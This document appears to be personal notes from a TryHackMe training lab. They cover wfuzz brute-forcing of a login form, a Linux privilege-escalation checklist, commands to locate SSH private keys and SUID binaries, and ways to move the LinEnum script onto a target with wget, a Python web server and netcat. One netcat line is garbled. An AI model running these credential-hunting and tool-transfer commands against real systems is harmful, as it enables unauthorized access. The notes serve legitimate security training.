# FUZZING
```
An Introduction to Using wfuzz
The premise behind wfuzz is simple. Occasionally you want a bit more information about how much data something within a web application returns. This could be anything from a file, a response code (i.e. 404 meaning the URL doesn't exist) or the parameters used in a form similar to the form you attacked in Day 2.

For example, let's say you are pentesting a note-taking application and you want to see if you can view notes by other users. One way you may want to achieve this is by FUZZing for usernames (with the knowledge that every valid user will have note.txt by default). Our wfuzz command would like the following: wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt

Now wfuzz will query the webserver using the words iterated from the "big.txt" wordlist. To illustrate:

Query #1: http://localhost/admin/note.txt
Query #2: http://localhost/administrator/note.txt
Query #3: http://localhost/system/note.txt
Options	Description
-c	Shows the output in color
-d	Specify the parameters you want to fuzz with, where the data is encoded for a HTML form
-z	Specifies what will replace FUZZ in the request. For example -z file,big.txt. We're telling wfuzz to look for files by replacing "FUZZ" with the words within "big.txt"
--hc	Don't show certain http response codes. I.e. Don't show 404 responses that indicate the file doesn't exist, or "200" to indicate the file does exist
--hl	Don't show for a certain amount of lines in the response
--hh	Don't show for a certain amount of words
```

Let's bring this together and demonstrate some of these options. Let's say we wanted to fuzz an application on http://shibes.thm/login.php to find the correct credentials to the login form. After recalling our knowledge from Day 2, we know all about URL parameters! We can take a bit of a guess as to what parameters the login form may be using username and password, right? Worth a try! Our wfuzz command would look like so: wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php

Where wfuzz will now iterate through the wordlist we provided and replace the "FUZZ" values specified in the "username" and "password" parameters.

# The "Priv Esc Checklist"
As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement. Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.

* Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
* Locating other services running or applications installed that may be abusable (SUID & out of date software)
* Looking for automated scripts like backup scripts (exploiting crontabs)
* Credentials (user accounts, application config files..)
* Mis-configured file and directory permissions

![image ](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img2.png)

![image](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img3.png)

![image](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img4.png)

`find / -name id_rsa 2> /dev/null`
`find / -perm -u=s -type f 2>/dev/null`

# Ways to Send scripts

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
`python3 -m http.server 8080 -> wget http://IP:8080/filename`
`python3 -m http.server 8080`
`nc -w -3 10.10.36.138 1337 < LinEnum.sh -> nc -w -3 10.10.36.138 1337 < LinEnum.sh`

# Logs and persist

* /var/log -> auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
* "/var/log/syslog" (System events such as firewall alerts:)\
* "/var/log/<service/"
* * For example, the access logs of apache2
* * */var/log/apache2/access.log

# SUID
* `!!!!!!!!!!!! GTFOOOOOOOOOOOOOOOO !!!!!!!!!!!!!!!!!!!!!!!!
